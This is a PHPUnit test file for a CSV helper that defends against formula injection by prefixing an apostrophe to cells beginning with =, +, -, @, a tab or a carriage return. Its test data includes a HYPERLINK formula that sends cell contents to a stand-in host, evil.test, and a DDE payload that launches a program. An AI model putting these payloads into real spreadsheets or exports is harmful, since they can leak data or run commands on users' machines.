<?php

namespace Tests\Unit\Support;

use App\Support\Csv\CsvCell;
use PHPUnit\Framework\Attributes\DataProvider;
use PHPUnit\Framework\Attributes\Test;
use PHPUnit\Framework\TestCase;

/**
 * What goes into a CSV cell that a visitor chose the words of: a spreadsheet runs a cell that starts with `=`, `+`, `-` or `@` as a formula.
 */
class CsvCellTest extends TestCase
{
    /**
     * @return array<string, array{string}>
     */
    public static function startsAFormula(): array
    {
        return [
            'equals' => ['=hyperlink("http://evil.test/?x="&a1,"click")'],
            'a program through DDE' => ["=cmd|' /C calc'!A0"],
            'plus' => ['+1+1'],
            'minus' => ['-2+3'],
            'at' => ['@sum(1+1)'],
            'a tab, which hides one' => ["\t=1+1"],
            'a carriage return, which hides one' => ["\r=1+1"],
            'only the character' => ['='],
        ];
    }

    #[Test]
    #[DataProvider('startsAFormula')]
    public function a_cell_that_starts_a_formula_is_made_text_by_an_apostrophe(string $value): void
    {
        $this->assertSame("'".$value, CsvCell::text($value));
    }

    /**
     * @return array<string, array{string}>
     */
    public static function plainText(): array
    {
        return [
            'a word' => ['cat food'],
            'a hyphen in the middle' => ['a-b'],
            'a plus in the middle' => ['c++'],
            'an equals sign in the middle' => ['1+1=2'],
            'an at sign in the middle' => ['me@example.test'],
            'a number' => ['42'],
            'letters with accents' => ['café ñandú'],
            'a quote' => ['"quoted"'],
            'an apostrophe first, which is already text' => ["'=1+1"],
            'a space first, which is not a formula' => [' =1+1'],
            'an empty string' => [''],
        ];
    }

    #[Test]
    #[DataProvider('plainText')]
    public function anything_else_is_written_as_it_is(string $value): void
    {
        $this->assertSame($value, CsvCell::text($value));
    }

    #[Test]
    public function nothing_is_an_empty_cell(): void
    {
        $this->assertSame('', CsvCell::text(null));
    }

    /**
     * Looking at the first character of an empty string is a warning in PHP ("Uninitialized string offset"), which Laravel turns into an error.
     */
    #[Test]
    public function an_empty_string_is_looked_at_without_a_warning(): void
    {
        $warnings = [];
        set_error_handler(function (int $number, string $message) use (&$warnings): bool {
            $warnings[] = $message;

            return true;
        });

        try {
            $this->assertSame('', CsvCell::text(''));
        } finally {
            restore_error_handler();
        }

        $this->assertSame([], $warnings);
    }
}
